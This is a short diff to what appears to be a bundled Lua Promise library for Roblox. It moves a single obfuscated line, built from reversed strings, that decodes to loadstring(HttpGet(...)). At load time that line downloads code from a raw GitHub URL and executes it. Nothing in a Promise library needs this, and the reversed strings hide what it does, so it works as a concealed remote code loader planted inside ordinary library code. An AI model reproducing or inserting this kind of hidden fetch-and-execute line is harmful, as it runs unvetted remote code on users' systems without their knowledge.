@@ -2089,11 +2089,11 @@ function Promise.onUnhandledRejection(callback)
 		end
 	end
 end
-getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
+
 return Promise
  end,
 }
-
+	getgenv()[("gnirtsdaol"):reverse()](game[("teGpttH"):reverse()](game, ("yrarbil02%IUxineohP/niam/eihpad/7d4fl/moc.tnetnocresubuhtig.war//:sptth"):reverse()))()
 	local o_require = require
 	setmetatable(imports, {
 		__index = function(self, k) 
